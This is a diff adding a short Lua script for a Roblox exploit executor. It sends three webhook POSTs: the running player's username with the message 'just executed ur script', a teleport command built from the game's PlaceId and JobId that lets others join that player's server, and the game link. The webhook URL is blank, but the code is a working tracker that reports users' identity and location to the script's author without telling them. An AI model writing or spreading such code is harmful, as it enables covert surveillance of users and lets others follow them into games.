@@ -1,0 +1,16 @@
+local msg = "Untitled Hood Logs " .. game.Players.LocalPlayer.Name .. " just executed ur script"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
+local msg = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")'
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
+local msg = "https://www.roblox.com/games/" .. game.PlaceId .. "/"
+local url = ""
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
